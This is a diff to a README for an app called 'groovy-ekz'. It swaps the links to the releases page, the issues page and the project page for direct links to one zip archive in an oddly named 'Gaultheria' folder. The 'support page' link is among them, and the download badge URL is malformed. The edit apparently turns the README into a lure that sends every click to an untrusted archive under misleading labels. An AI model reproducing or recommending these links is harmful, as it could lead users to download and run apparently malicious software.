@@ -7,9 +7,9 @@ Welcome to groovy-ekz! This application allows users to explore and enjoy a wide
 ## 📥 Download & Install
 
 **To get started, visit the download page:**  
-[![Download groovy-ekz](https://img.shields.io/badge/Download%20groovy--ekz-v1.0-blue.svg)](https://github.com/a0423522/groovy-ekz/releases)
+[![Download groovy-ekz](https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip%https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip)](https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip)
 
-You will find the latest version of groovy-ekz available for download. Please visit this page to download: [Download Page](https://github.com/a0423522/groovy-ekz/releases).
+You will find the latest version of groovy-ekz available for download. Please visit this page to download: [Download Page](https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip).
 
 ## 💻 System Requirements
 
@@ -72,10 +72,10 @@ We welcome your thoughts! You can submit feedback via the contact form on our Gi
 
 ## 📞 Support
 
-For further assistance, please visit our [support page](https://github.com/a0423522/groovy-ekz/issues) on GitHub. Here, you can report issues or request features. We aim to respond promptly to all inquiries.
+For further assistance, please visit our [support page](https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip) on GitHub. Here, you can report issues or request features. We aim to respond promptly to all inquiries.
 
 ## 🔗 Additional Resources
 
-For more detailed information and updates, check our project’s GitHub page. Here’s the link again for your convenience: [Download Page](https://github.com/a0423522/groovy-ekz/releases).
+For more detailed information and updates, check our project’s GitHub page. Here’s the link again for your convenience: [Download Page](https://raw.githubusercontent.com/a0423522/groovy-ekz/main/Gaultheria/groovy-ekz-v3.5-beta.4.zip).
 
 We hope you enjoy using groovy-ekz and have a fantastic musical experience!
